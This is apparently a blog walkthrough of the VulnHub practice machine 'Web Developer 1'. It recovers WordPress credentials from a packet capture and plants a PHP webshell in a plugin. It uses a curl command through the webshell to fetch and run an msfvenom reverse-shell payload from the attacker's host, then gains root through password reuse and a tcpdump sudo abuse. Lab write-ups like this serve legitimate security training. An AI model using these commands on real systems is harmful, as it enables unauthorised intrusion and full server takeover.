---
title: VulnHub - Web Developer 1
author: ret2x
date: 2022-01-02 15:53:32 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, wordpress, rce]
image:
    path: /assets/images/webdeveloper/front.png
---

**Description:** A linux machine which implies parsing a PCAP file to discover captured credentials, logging into wordpress and finding the way to execute system commands. Password reuse and setting sudo permissions to the tcpdump utility allowed full access to the server.

**Author:** Fred Wemeijer

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/web-developer-1,288/](https://www.vulnhub.com/entry/web-developer-1,288/)

## Information Gathering
### Host Discovery

We start discovering our target in the local network with netdiscover.

```console
root@kali:~$ netdiscover -i vmnet1 -r 192.168.179.0/24  
 Currently scanning: Finished!   |   Screen View: Unique Hosts      
                                                                   
 6 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 342      
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.179.184 00:0c:29:fc:85:b7      5     300  VMware, Inc.
```

### Port Scanning

We proceed to perform a full TCP por scan with nmap.

```console
root@kali:~$ nmap -v -n -p1-65535 -T4 -Pn 192.168.179.184 -oG nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Service Enumeration

We do a service enumeration and script scanning on discovered open ports.

```console
root@kali:~$ nmap -sV -sC -p22,80 -v -n -Pn 192.168.179.184 -oN nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:ac:73:4c:17:ec:6a:82:79:87:5a:f9:22:d4:12:cb (RSA)
|   256 9c:d5:f3:2c:e2:d0:06:cc:8c:15:5a:5a:81:5b:03:3d (ECDSA)
|_  256 ab:67:56:69:27:ea:3e:3b:33:73:32:f8:ff:2e:1f:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 4.9.8
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Example site &#8211; Just another WordPress site
...
```

### Web Enumeration

A wordpress web page is running on port 80, we need to enumerate more in detail about it.

![](/assets/images/webdeveloper/screenshot-1.png)

We run wpscan to discover vulnerable plugins and themes and list potencial users.

```console
root@kali:~$ wpscan --url http://192.168.179.184/ --enumerate vp,vt,u,dbe
...
[+] Upload directory has listing enabled: http://192.168.179.184/wp-content/uploads/                                                                                
 | Found By: Direct Access (Aggressive Detection)                                                                                                                   
 | Confidence: 100% 
 ...
 [+] webdeveloper
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.179.184/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
 ...
```

As we see, it was only possible to find a directory listing in the **uploads** directory and a user.

Then, a fast directory enumeration with dirb was found the **ipdata** directory.

```console
root@kali:~$ dirb http://192.168.179.184/ -r

---- Scanning URL: http://192.168.179.184/ ----                                                                                                                     
+ http://192.168.179.184/index.php (CODE:301|SIZE:0)                                                                                                                
==> DIRECTORY: http://192.168.179.184/ipdata/                                                                                                                       
+ http://192.168.179.184/server-status (CODE:403|SIZE:303)                                                                                                          
==> DIRECTORY: http://192.168.179.184/wp-admin/                                                                                                                     
==> DIRECTORY: http://192.168.179.184/wp-content/                                                                                                                   
==> DIRECTORY: http://192.168.179.184/wp-includes/                                                                                                                  
+ http://192.168.179.184/xmlrpc.php (CODE:405|SIZE:42)
```

It file contains the **analyze.cap** file.

![](/assets/images/webdeveloper/screenshot-2.png)

We download it.

```console
root@kali:~$ wget http://192.168.179.184/ipdata/analyze.cap
```

We start wireshark.

```console
root@kali:~$ wireshark >&/dev/null &
```

Then we click on a TCP package, right click and select **follow TCP stream**, and we see that the webdeveloper user has logged in to wordpress.

![](/assets/images/webdeveloper/screenshot-3.png)

We decode the password, so it is not readable.

```console
root@kali:~$ urlencode -d 'Te5eQg%264sBS%21Yr%24%29wf%25%28DcAd'
Te5eQg&4sBS!Yr$)wf%(DcAd
```

We login as user **webdeveloper** and password **Te5eQg&4sBS!Yr$)wf%(DcAd**.

![](/assets/images/webdeveloper/screenshot-4.png)

![](/assets/images/webdeveloper/screenshot-5.png)


## Exploitation
### Remote Code Execution

This user has elevate permissions, so that we add a webshell to the plugin **akismet.php**.

![](/assets/images/webdeveloper/screenshot-6.png)

Then, we check that our php webshell is running successfully the **id** command.

![](/assets/images/webdeveloper/screenshot-7.png)

We list the system information and we detect that is a 64 bit operating system.

```console
root@kali:~$ curl -s "http://192.168.179.184/wp-content/plugins/akismet/akismet.php?cmd=$(urlencode -m 'uname -a')"
Linux webdeveloper 4.15.0-38-generic #41-Ubuntu SMP Wed Oct 10 10:59:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

We generate a linux 64 bit payload with msfvenom.

```console
root@kali:~$ msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp lhost=192.168.179.1 lport=443 -f elf -o evil
```

We start a python web server on port 80.

```console
root@kali:~$ python3 -m http.server 80
```

We set up a netcat listener on port 443, we run the following curl instruction that really do is download the paylod to the victim machine, give it execution permissions and execute it.

```console
root@kali:~$ curl -s "http://192.168.179.184/wp-content/plugins/akismet/akismet.php?cmd=$(urlencode -m 'curl 192.168.179.1/evil -o /tmp/evil && chmod +x /tmp/evil && /tmp/evil')"
```
If everything wen well, we get a shell.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.184] 36790
script -qc /bin/bash /dev/null
www-data@webdeveloper:/var/www/html/wp-content/plugins/akismet$
```

Listing the wordpress config file was found the password of mysql connection.

```console
www-data@webdeveloper:/var/www/html$ head -n 40 wp-config.php
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'webdeveloper');

/** MySQL database password */
define('DB_PASSWORD', 'MasterOfTheUniverse');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
...
```

## Privilege Escalation
### Password Reuse

I tried to re-use the password **MasterOfTheUniverse** to log in as the user webdeveloper.

```console
www-data@webdeveloper:/var/www/html$ su - webdeveloper
su - webdeveloper
Password: MasterOfTheUniverse

webdeveloper@webdeveloper:~$
```

We can run the tcpdump tool with sudo permissions, a way to get root.

```console
webdeveloper@webdeveloper:~$ sudo -l
sudo -l
[sudo] password for webdeveloper: MasterOfTheUniverse

Matching Defaults entries for webdeveloper on webdeveloper:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webdeveloper may run the following commands on webdeveloper:
    (root) /usr/sbin/tcpdump
webdeveloper@webdeveloper:~$
```

### Sudo Permissions

We will reuse the payload generated before, set up a netcat listener on port 443, and we execute the following tcpdump command that will execute our payload as user root, this topic was extracted from [GTFOBINS](https://gtfobins.github.io/gtfobins/tcpdump).

```console
webdeveloper@webdeveloper:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/evil -Z root
```

And finally we have a shell with root permissions, and read the flag.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.184] 39914
script -qc /bin/bash /dev/null
root@webdeveloper:/home/webdeveloper#
```

```console
root@webdeveloper:/home/webdeveloper# cd /root
cd /root
root@webdeveloper:/root# ls 
ls 
flag.txt
root@webdeveloper:/root# cat flag.txt
cat flag.txt
Congratulations here is youre flag:
cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290
root@webdeveloper:/root#
```
